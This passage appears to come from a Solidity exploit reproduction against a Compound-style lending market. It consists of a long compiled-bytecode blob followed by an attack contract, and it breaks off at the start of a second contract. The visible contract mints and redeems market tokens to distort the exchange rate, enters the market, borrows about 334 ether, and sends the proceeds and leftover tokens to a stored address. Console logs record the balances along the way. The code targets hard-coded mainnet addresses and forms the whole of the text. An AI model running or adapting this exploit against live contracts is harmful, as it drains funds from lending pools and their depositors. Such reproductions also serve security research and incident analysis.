5050600d5482519293506001600160a01b03169183915060009062000b2d5762000b2d62002bf2565b6001600160a01b039283166020918202929092010152600c5482519116908290600190811062000b615762000b6162002bf2565b6001600160a01b039283166020918202929092010152600d5460145460405163095ea7b360e01b81529183169263095ea7b39262000ba89290911690899060040162002974565b6020604051808303816000875af115801562000bc8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000bee91906200298d565b506014546001600160a01b03166338ed17398662000c0e60648662002a5f565b62000c1a908662002a82565b843062000c2a42610e106200295e565b6040518663ffffffff1660e01b815260040162000c4c95949392919062002c08565b6000604051808303816000875af115801562000c6c573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405262000c96919081019062002c7d565b505050505050565b60008060405160200162000cb491815260200190565b60408051601f19818403018152919052805160209091012060055490915060009062000ce9906001600160a01b0316620009b9565b9050600062000cf9828462000332565b600c546040516370a0823160e01b81523060048201529192506001600160a01b03169063a9059cbb90839083906370a0823190602401602060405180830381865afa15801562000d4d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000d73919062002a45565b6040518363ffffffff1660e01b815260040162000d9292919062002974565b6020604051808303816000875af115801562000db2573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000dd891906200298d565b5060408051808201825260168152751a189a9a18199ca2311c1b9a1b31311c1b1a1921332360511b6020808301919091526005549251919260009287926001600160a01b039092169173fbeeaa651e5abe3b820ae03cf4db5aecf96babab916315706fdf9162000e4e9160019189910162002d2e565b6040516020818303038152906040526040518263ffffffff1660e01b815260040162000e7b9190620028e3565b602060405180830381865af415801562000e99573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000ebf919062002b5f565b60405162000ecd9062002687565b6001600160a01b039283168152911660208201526040018190604051809103906000f590508015801562000f05573d6000803e3d6000fd5b5060055460048054604051635572051560e11b81526001600160a01b03808616938201939093529082166024820152929350169063aae40a2a906001906044016000604051808303818588803b15801562000f5f57600080fd5b505af115801562000f74573d6000803e3d6000fd5b5050600480546040516370a0823160e01b815230928101929092526001600160a01b0316935063db006a7592508391506370a0823190602401602060405180830381865afa15801562000fcb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000ff1919062002a45565b6040518263ffffffff1660e01b81526004016200101091815260200190565b6020604051808303816000875af115801562001030573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001056919062002a45565b50600d60009054906101000a90046001600160a01b03166001600160a01b031663d0e30db0476040518263ffffffff1660e01b81526004016000604051808303818588803b158015620010a857600080fd5b505af1158015620010bd573d6000803e3d6000fd5b50505050505050505050565b600080604051602001620010df91815260200190565b6040516020818303038152906040528051906020012060001c90506000620011078362000391565b9050600062001117828462000332565b600c546040516370a0823160e01b81523060048201529192506001600160a01b03169063a9059cbb90839083906370a0823190602401602060405180830381865afa1580156200116b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001191919062002a45565b6040518363ffffffff1660e01b8152600401620011b092919062002974565b6020604051808303816000875af1158015620011d0573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620011f691906200298d565b506000604051806040016040528060168152602001751a189a9a18199ca2311c1b9a1b31311c1b1a1921332360511b815250905060008460001b8673fbeeaa651e5abe3b820ae03cf4db5aecf96babab6315706fdf6001866040516020016200126192919062002d2e565b6040516020818303038152906040526040518263ffffffff1660e01b81526004016200128e9190620028e3565b602060405180830381865af4158015620012ac573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620012d2919062002b5f565b604051620012e09062002679565b6001600160a01b039283168152911660208201526040018190604051809103906000f590508015801562001318573d6000803e3d6000fd5b506007549091506001600160a01b038781169116146200141557856001600160a01b0316636f307dc36040518163ffffffff1660e01b8152600401602060405180830381865afa15801562001371573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001397919062002b5f565b6001600160a01b031663095ea7b3876000196040518363ffffffff1660e01b8152600401620013c892919062002974565b6020604051808303816000875af1158015620013e8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200140e91906200298d565b5062001480565b600f5460405163095ea7b360e01b81526001600160a01b039091169063095ea7b3906200144b9089906000199060040162002974565b600060405180830381600087803b1580156200146657600080fd5b505af11580156200147b573d6000803e3d6000fd5b505050505b60048054604051637af1e23160e11b81526001600160a01b03848116938201939093526001602482015290821660448201529087169063f5e3c462906064016020604051808303816000875af1158015620014df573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001505919062002a45565b50600480546040516370a0823160e01b815230928101929092526001600160a01b03169063db006a759082906370a0823190602401602060405180830381865afa15801562001558573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200157e919062002a45565b6040518263ffffffff1660e01b81526004016200159d91815260200190565b6020604051808303816000875af1158015620015bd573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620015e3919062002a45565b50505050505050565b6010546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801562001636573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200165c919062002a45565b9050600080601860009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015620016b5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620016db919062002b9c565b509150915060006200170184846001600160701b0316846001600160701b031662002517565b6040805160028082526060820183529293506000929091602083019080368337505060105482519293506001600160a01b0316918391506000906200174a576200174a62002bf2565b6001600160a01b039283166020918202929092010152600d548251911690829060019081106200177e576200177e62002bf2565b6001600160a01b03928316602091820292909201015260105460145460405163095ea7b360e01b81529183169263095ea7b39262000ba89290911690899060040162002974565b600f546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa1580156200180f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001835919062002a45565b9050600080601760009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156200188e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620018b4919062002b9c565b50915091506000620018da84846001600160701b0316846001600160701b031662002517565b60408051600280825260608201835292935060009290916020830190803683375050600f5482519293506001600160a01b03169183915060009062001923576200192362002bf2565b6001600160a01b039283166020918202929092010152600d5482519116908290600190811062001957576200195762002bf2565b6001600160a01b039283166020918202929092010152600f5460145460405163095ea7b360e01b81529183169263095ea7b3926200199f929091169060009060040162002974565b600060405180830381600087803b158015620019ba57600080fd5b505af1158015620019cf573d6000803e3d6000fd5b5050600f5460145460405163095ea7b360e01b81526001600160a01b03928316945063095ea7b3935062001a0c9290911690899060040162002974565b600060405180830381600087803b15801562001a2757600080fd5b505af115801562001a3c573d6000803e3d6000fd5b50506014546001600160a01b031691506338ed173990508662000c0e60648662002a5f565b6011546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801562001aab573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001ad1919062002a45565b9050600080601a60009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa15801562001b2a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001b50919062002b9c565b5091509150600062001b7684846001600160701b0316846001600160701b031662002517565b6040805160028082526060820183529293506000929091602083019080368337505060115482519293506001600160a01b03169183915060009062001bbf5762001bbf62002bf2565b6001600160a01b039283166020918202929092010152600d5482519116908290600190811062001bf35762001bf362002bf2565b6001600160a01b03928316602091820292909201015260115460145460405163095ea7b360e01b81529183169263095ea7b39262001c3a9290911690899060040162002974565b6020604051808303816000875af115801562001c5a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001c8091906200298d565b506014546001600160a01b0316635c11d7958662001ca060648662002a5f565b62001cac908662002a82565b843062001cbc42610e106200295e565b6040518663ffffffff1660e01b815260040162001cde95949392919062002c08565b600060405180830381600087803b15801562001cf957600080fd5b505af115801562001d0e573d6000803e3d6000fd5b505050505050505050565b6012546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801562001d63573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001d89919062002a45565b9050600080601960009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa15801562001de2573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001e08919062002b9c565b5091509150600062001e2e84846001600160701b0316846001600160701b031662002517565b6040805160028082526060820183529293506000929091602083019080368337505060125482519293506001600160a01b03169183915060009062001e775762001e7762002bf2565b6001600160a01b039283166020918202929092010152600d5482519116908290600190811062001eab5762001eab62002bf2565b6001600160a01b03928316602091820292909201015260125460145460405163095ea7b360e01b81529183169263095ea7b39262000ba89290911690899060040162002974565b600e546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801562001f3c573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001f62919062002a45565b9050600080601660009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa15801562001fbb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001fe1919062002b9c565b509150915060006200200784846001600160701b0316846001600160701b031662002517565b60408051600280825260608201835292935060009290916020830190803683375050600e5482519293506001600160a01b03169183915060009062002050576200205062002bf2565b6001600160a01b039283166020918202929092010152600d5482519116908290600190811062002084576200208462002bf2565b6001600160a01b039283166020918202929092010152600e5460145460405163095ea7b360e01b81529183169263095ea7b39262000ba89290911690899060040162002974565b6013546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801562002115573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200213b919062002a45565b9050600080601b60009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa15801562002194573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620021ba919062002b9c565b50915091506000620021e084846001600160701b0316846001600160701b031662002517565b6040805160028082526060820183529293506000929091602083019080368337505060135482519293506001600160a01b03169183915060009062002229576200222962002bf2565b6001600160a01b039283166020918202929092010152600d548251911690829060019081106200225d576200225d62002bf2565b6001600160a01b03928316602091820292909201015260135460145460405163095ea7b360e01b81529183169263095ea7b39262000ba89290911690899060040162002974565b600c546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa158015620022ee573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062002314919062002a45565b9050600080601560009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156200236d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062002393919062002b9c565b50915091506000620023b984846001600160701b0316846001600160701b031662002517565b60408051600280825260608201835292935060009290916020830190803683375050600c5482519293506001600160a01b03169183915060009062002402576200240262002bf2565b6001600160a01b039283166020918202929092010152600d5482519116908290600190811062002436576200243662002bf2565b6001600160a01b039283166020918202929092010152600c5460145460405163095ea7b360e01b81529183169263095ea7b39262000ba89290911690899060040162002974565b620009b3848484846040516024016200249a949392919062002d57565b60408051601f198184030181529190526020810180516001600160e01b0316631f118ca960e21b1790526200264a565b620025138282604051602401620024e392919062002da0565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b1790526200264a565b5050565b6000808411620025825760405162461bcd60e51b815260206004820152602b60248201527f556e697377617056324c6962726172793a20494e53554646494349454e545f4960448201526a1394155517d05353d5539560aa1b60648201526084015b60405180910390fd5b600083118015620025935750600082115b620025f25760405162461bcd60e51b815260206004820152602860248201527f556e697377617056324c6962726172793a20494e53554646494349454e545f4c604482015267495155494449545960c01b606482015260840162002579565b600062002602856103e562002dc4565b9050600062002612848362002dc4565b905060008262002625876103e862002dc4565b6200263191906200295e565b90506200263f818362002a5f565b979650505050505050565b620026558162002658565b50565b60006a636f6e736f6c652e6c6f679050600080835160208501845afa505050565b610f058062002ddf83390190565b610bcd8062003ce483390190565b6001600160a01b03811681146200265557600080fd5b60008083601f840112620026be57600080fd5b50813567ffffffffffffffff811115620026d757600080fd5b602083019150836020828501011115620026f057600080fd5b9250929050565b60008060008060008060a087890312156200271157600080fd5b86356200271e8162002695565b9550602087013594506040870135935060608701356200273e8162002695565b9250608087013567ffffffffffffffff8111156200275b57600080fd5b6200276989828a01620026ab565b979a9699509497509295939492505050565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff81118282101715620027bd57620027bd6200277b565b604052919050565b60008060408385031215620027d957600080fd5b823567ffffffffffffffff80821115620027f257600080fd5b818501915085601f8301126200280757600080fd5b81356020828211156200281e576200281e6200277b565b62002832601f8301601f1916820162002791565b925081835287818386010111156200284957600080fd5b8181850182850137600091830181019190915290969401359450505050565b6000602082840312156200287b57600080fd5b8135620028888162002695565b9392505050565b60005b83811015620028ac57818101518382015260200162002892565b50506000910152565b60008151808452620028cf8160208601602086016200288f565b601f01601f19169290920160200192915050565b602081526000620028886020830184620028b5565b6000806000604084860312156200290e57600080fd5b83359250602084013567ffffffffffffffff8111156200292d57600080fd5b6200293b86828701620026ab565b9497909650939450505050565b634e487b7160e01b600052601160045260246000fd5b808201808211156200038b576200038b62002948565b6001600160a01b03929092168252602082015260400190565b600060208284031215620029a057600080fd5b815180151581146200288857600080fd5b60008451620029c58184602089016200288f565b845190830190620029db8183602089016200288f565b8451910190620029f08183602088016200288f565b0195945050505050565b6001600160a01b038681168252851660208201526040810184905260a06060820181905260009062002a2f90830185620028b5565b905061ffff831660808301529695505050505050565b60006020828403121562002a5857600080fd5b5051919050565b60008262002a7d57634e487b7160e01b600052601260045260246000fd5b500490565b818103818111156200038b576200038b62002948565b8054600090600181811c908083168062002ab357607f831692505b6020808410820362002ad557634e487b7160e01b600052602260045260246000fd5b81801562002aec576001811462002b025762002b31565b60ff198616895284151585028901965062002b31565b60008881526020902060005b8681101562002b295781548b82015290850190830162002b0e565b505084890196505b50505050505092915050565b600062002b4b828662002a98565b838582376000930192835250909392505050565b60006020828403121562002b7257600080fd5b8151620028888162002695565b80516001600160701b038116811462002b9757600080fd5b919050565b60008060006060848603121562002bb257600080fd5b62002bbd8462002b7f565b925062002bcd6020850162002b7f565b9150604084015163ffffffff8116811462002be757600080fd5b809150509250925092565b634e487b7160e01b600052603260045260246000fd5b600060a08201878352602087602085015260a0604085015281875180845260c08601915060208901935060005b8181101562002c5c5784516001600160a01b03168352938301939183019160010162002c35565b50506001600160a01b03969096166060850152505050608001529392505050565b6000602080838503121562002c9157600080fd5b825167ffffffffffffffff8082111562002caa57600080fd5b818501915085601f83011262002cbf57600080fd5b81518181111562002cd45762002cd46200277b565b8060051b915062002ce784830162002791565b818152918301840191848101908884111562002d0257600080fd5b938501935b8385101562002d225784518252938501939085019062002d07565b98975050505050505050565b600062002d3c828562002a98565b835162002d4e8183602088016200288f565b01949350505050565b60808152600062002d6c6080830187620028b5565b856020840152828103604084015262002d868186620028b5565b91505060018060a01b038316606083015295945050505050565b60408152600062002db56040830185620028b5565b90508260208301529392505050565b80820281158282048414176200038b576200038b6200294856fe60806040819052600180546001600160a01b0319908116736982508145454ce325ddbe47a25d4ec3d23119331790915560028054821673dac17f958d2ee523a2206206994597c13d831ec7179055600380548216735fdbcd61bc9bd4b6d3fd1f49a5d253165ea1175017905560048054909116737d61ed92a6778f5abf5c94085739f1edabec2800179055610f05388190039081908339810160408190526100a691610c27565b6040805132602082015201604051602081830303815290604052805190602001207f60b0a6e75438d0e9ba5289b3cbbec031c025c782fdfc91f64d12e671fe40fc6460001b146100f557600080fd5b604080516001600160a01b0383166020820152600a910160405160208183030381529060405280519060200120901c7e182c29b9d50e343a6e94a26cf2efb00c700971e0bf7f247d9344b99c7f903f60001b03610c0857600080546001600160a01b0319166001600160a01b038481169190911790915560015460035460405163095ea7b360e01b81529083166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af11580156101ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101de9190610c61565b5060035460405163140e25ad60e31b8152670de0b6b3a764000060048201526001600160a01b039091169063a0712d68906024016020604051808303816000875af1158015610231573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102559190610c8a565b50600354604080516318160ddd60e01b815290516001600160a01b039092169163db006a759160029184916318160ddd9160048083019260209291908290030181865afa1580156102aa573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ce9190610c8a565b6102d89190610cb9565b6040518263ffffffff1660e01b81526004016102f691815260200190565b6020604051808303816000875af1158015610315573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103399190610c8a565b506001546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa158015610383573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103a79190610c8a565b60015460035460405163a9059cbb60e01b81526001600160a01b03918216600482015260248101849052929350169063a9059cbb906044016020604051808303816000875af11580156103fe573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104229190610c61565b5060408051600180825281830190925260009160208083019080368337505060035482519293506001600160a01b03169183915060009061046557610465610ce8565b6001600160a01b03928316602091820292909201015260048054604051631853304760e31b815292169163c2998238916104a191859101610cfe565b6000604051808303816000875af11580156104c0573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526104e89190810190610d4b565b506000805460408051631d8e90d160e11b815290516001926001600160a01b031691633b1d21a29160048083019260209291908290030181865afa158015610534573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105589190610c8a565b6105629190610cb9565b60005460405163317afabb60e21b8152600481018390529192506001600160a01b03169063c5ebeaec906024016020604051808303816000875af11580156105ae573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105d29190610c8a565b5060025460005460408051636f307dc360e01b815290516001600160a01b039384169390921691636f307dc3916004808201926020929091908290030181865afa158015610624573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106489190610e08565b6001600160a01b03161461082e5760008054906101000a90046001600160a01b03166001600160a01b0316636f307dc36040518163ffffffff1660e01b8152600401602060405180830381865afa1580156106a7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106cb9190610e08565b6001600160a01b031663a9059cbb3360008054906101000a90046001600160a01b03166001600160a01b0316636f307dc36040518163ffffffff1660e01b8152600401602060405180830381865afa15801561072b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061074f9190610e08565b6040516370a0823160e01b81523060048201526001600160a01b0391909116906370a0823190602401602060405180830381865afa158015610795573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107b99190610c8a565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610804573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108289190610c61565b50610903565b6002546040516370a0823160e01b81523060048201526001600160a01b039091169063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610880573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108a49190610c8a565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401600060405180830381600087803b1580156108ea57600080fd5b505af11580156108fe573d6000803e3d6000fd5b505050505b6000610910600185610cb9565b60035460405163852a12e360e01b8152600481018390529192506001600160a01b03169063852a12e3906024016020604051808303816000875af115801561095c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109809190610c8a565b506003546040516361bfb47160e11b81523060048201526000916001600160a01b03169063c37f68e290602401608060405180830381865afa1580156109ca573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109ee9190610e25565b600480546000805460035460405163c488847b60e01b81526001600160a01b03928316958101959095528116602485015260016044850152939750955091909116925063c488847b91506064016040805180830381865afa158015610a57573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a7b9190610e5b565b6003549092506001600160a01b0316905063a0712d686002610aa5670de0b6b3a764000086610e7f565b610aaf9085610ea1565b610ab99190610cb9565b6040518263ffffffff1660e01b8152600401610ad791815260200190565b6020604051808303816000875af1158015610af6573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b1a9190610c8a565b506001546040516370a0823160e01b81523060048201526001600160a01b039091169063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610b6d573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b919190610c8a565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610bdc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610c009190610c61565b505050505050505b5050610eb8565b6001600160a01b0381168114610c2457600080fd5b50565b60008060408385031215610c3a57600080fd5b8251610c4581610c0f565b6020840151909250610c5681610c0f565b809150509250929050565b600060208284031215610c7357600080fd5b81518015158114610c8357600080fd5b9392505050565b600060208284031215610c9c57600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b81810381811115610ccc57610ccc610ca3565b92915050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b6020808252825182820181905260009190848201906040850190845b81811015610d3f5783516001600160a01b031683529284019291840191600101610d1a565b50909695505050505050565b60006020808385031215610d5e57600080fd5b82516001600160401b0380821115610d7557600080fd5b818501915085601f830112610d8957600080fd5b815181811115610d9b57610d9b610cd2565b8060051b604051601f19603f83011681018181108582111715610dc057610dc0610cd2565b604052918252848201925083810185019188831115610dde57600080fd5b938501935b82851015610dfc57845184529385019392850192610de3565b98975050505050505050565b600060208284031215610e1a57600080fd5b8151610c8381610c0f565b60008060008060808587031215610e3b57600080fd5b505082516020840151604085015160609095015191969095509092509050565b60008060408385031215610e6e57600080fd5b505080516020909101519092909150565b600082610e9c57634e487b7160e01b600052601260045260246000fd5b500490565b8082028115828204841417610ccc57610ccc610ca3565b603f80610ec66000396000f3fe6080604052600080fdfea26469706673582212206ba8925d8546bb3c4427fb368dd1ccc6bd31b92726fd1a5a4245fa85f2374fb264736f6c6343000816003360806040819052600180546001600160a01b0319908116736982508145454ce325ddbe47a25d4ec3d231193317909155600280548216735fdbcd61bc9bd4b6d3fd1f49a5d253165ea1175017905560038054909116737d61ed92a6778f5abf5c94085739f1edabec2800179055610bcd3881900390819083398101604081905261008891610906565b6040805132602082015201604051602081830303815290604052805190602001207f60b0a6e75438d0e9ba5289b3cbbec031c025c782fdfc91f64d12e671fe40fc6460001b146100d757600080fd5b604080516001600160a01b0383166020820152600a910160405160208183030381529060405280519060200120901c7e182c29b9d50e343a6e94a26cf2efb00c700971e0bf7f247d9344b99c7f903f60001b036108e757600080546001600160a01b0319166001600160a01b038481169190911790915560015460025460405163095ea7b360e01b81529083166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af115801561019c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c09190610940565b5060025460405163140e25ad60e31b8152670de0b6b3a764000060048201526001600160a01b039091169063a0712d68906024016020604051808303816000875af1158015610213573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102379190610969565b5060028054604080516318160ddd60e01b815290516001600160a01b039092169263db006a7592909184916318160ddd916004808201926020929091908290030181865afa15801561028d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102b19190610969565b6102bb9190610998565b6040518263ffffffff1660e01b81526004016102d991815260200190565b6020604051808303816000875af11580156102f8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061031c9190610969565b506001546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa158015610366573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061038a9190610969565b60015460025460405163a9059cbb60e01b81526001600160a01b03918216600482015260248101849052929350169063a9059cbb906044016020604051808303816000875af11580156103e1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104059190610940565b5060408051600180825281830190925260009160208083019080368337505060025482519293506001600160a01b031691839150600090610448576104486109c7565b6001600160a01b039283166020918202929092010152600354604051631853304760e31b815291169063c2998238906104859084906004016109dd565b6000604051808303816000875af11580156104a4573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526104cc9190810190610a2a565b506000805460408051631d8e90d160e11b815290516001926001600160a01b031691633b1d21a29160048083019260209291908290030181865afa158015610518573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061053c9190610969565b6105469190610998565b60005460405163317afabb60e21b8152600481018390529192506001600160a01b03169063c5ebeaec906024016020604051808303816000875af1158015610592573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105b69190610969565b5060405133904780156108fc02916000818181858888f193505050501580156105e3573d6000803e3d6000fd5b5060006105f1600185610998565b60025460405163852a12e360e01b8152600481018390529192506001600160a01b03169063852a12e3906024016020604051808303816000875af115801561063d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106619190610969565b506002546040516361bfb47160e11b81523060048201526000916001600160a01b03169063c37f68e290602401608060405180830381865afa1580156106ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106cf9190610ae7565b6003546000805460025460405163c488847b60e01b81526001600160a01b03928316600482015290821660248201526001604482015293975090955016925063c488847b91506064016040805180830381865afa158015610734573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107589190610b1d565b600280549193506001600160a01b03909116915063a0712d6890610784670de0b6b3a764000086610b41565b61078e9085610b63565b6107989190610998565b6040518263ffffffff1660e01b81526004016107b691815260200190565b6020604051808303816000875af11580156107d5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107f99190610969565b506001546040516370a0823160e01b81523060048201526001600160a01b039091169063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561084c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108709190610969565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156108bb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108df9190610940565b505050505050505b5050610b7a565b6001600160a01b038116811461090357600080fd5b50565b6000806040838503121561091957600080fd5b8251610924816108ee565b6020840151909250610935816108ee565b809150509250929050565b60006020828403121561095257600080fd5b8151801515811461096257600080fd5b9392505050565b60006020828403121561097b57600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b818103818111156109ab576109ab610982565b92915050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b6020808252825182820181905260009190848201906040850190845b81811015610a1e5783516001600160a01b0316835292840192918401916001016109f9565b50909695505050505050565b60006020808385031215610a3d57600080fd5b82516001600160401b0380821115610a5457600080fd5b818501915085601f830112610a6857600080fd5b815181811115610a7a57610a7a6109b1565b8060051b604051601f19603f83011681018181108582111715610a9f57610a9f6109b1565b604052918252848201925083810185019188831115610abd57600080fd5b938501935b82851015610adb57845184529385019392850192610ac2565b98975050505050505050565b60008060008060808587031215610afd57600080fd5b505082516020840151604085015160609095015191969095509092509050565b60008060408385031215610b3057600080fd5b505080516020909101519092909150565b600082610b5e57634e487b7160e01b600052601260045260246000fd5b500490565b80820281158282048414176109ab576109ab610982565b604580610b886000396000f3fe608060405236600a57005b600080fdfea2646970667358221220ebfbb0aa3aaaa610e2cd936e1c9629294d0cadb92721c7885418f3f9f5cd159564736f6c63430008160033a2646970667358221220e19a170ea51b52c39feff33f0c1d6e0a9de3f457ac4a9e29a7a48cc654933bc364736f6c63430008160033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function call() public payable {}

    fallback() external payable {
        revert("no such function");
    }
}

contract Xf8e1 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x714b = 0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79;
    address constant x7d61 = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;

    address x526e;

    constructor(address a_x526e) payable {
        x526e = a_x526e; // 0x526e8E98356194b64EaE4C2d443cC8AAD367336f
        I(x6982).approve(x5fdb, type(uint256).max);
        I(x5fdb).mint(1000000000000000000);
        // uint256 v1 = 5000000000000000000000000000;
        uint256 v1 = I(x5fdb).totalSupply();
        console2.log("I(x5fdb).totalSupply()\t->", "5000000000000000000000000000 (5000000000.0 ether)");
        I(x5fdb).redeem(4999999999999999999999999998);
        // uint256 v2 = 2520870348093423681390050791471;
        uint256 v2 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093423681390050791471 (2520870348093.4236 ether)");
        I(x6982).transfer(x5fdb, v2);

        address[] memory arr15 = new address[](1);
        arr15[0] = x5fdb;
        I(x7d61).enterMarkets(arr15);

        I(x714b).getCash();
        I(x714b).borrow(334476442580295733160);
        x526e.call{value: 334476442580295733160}("");
        I(x5fdb).redeemUnderlying(2520870348093423681390050791470);
        I(x5fdb).getAccountSnapshot(r);
        I(x7d61).liquidateCalculateSeizeTokens(x714b, x5fdb, 1);
        I(x5fdb).mint(1763295678);
        // uint256 v3 = 2520870348093423681388287495792;
        uint256 v3 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093423681388287495792 (2520870348093.4236 ether)");
        I(x6982).transfer(x526e, v3);
    }

    function call() public payable {}

    fallback() external payable {
        revert("no such function");
    }
}

contract Xcede {
    address immutable r = address(this);
    receive() external payable {}
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
